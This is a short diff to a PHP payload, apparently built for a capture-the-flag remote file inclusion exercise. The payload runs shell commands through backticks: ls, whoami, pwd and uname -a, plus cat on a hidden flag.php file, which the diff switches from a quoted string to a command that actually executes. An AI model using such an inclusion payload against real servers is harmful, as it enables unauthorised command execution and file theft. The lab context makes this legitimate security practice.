@@ -4,7 +4,7 @@
 <!-- Comment out the PHP code should the code not be executed server side.
 <?php
     $ls_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
-    $catetchosts_output = 'cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php';
+    $catetchosts_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $uname_a = `uname -a`;
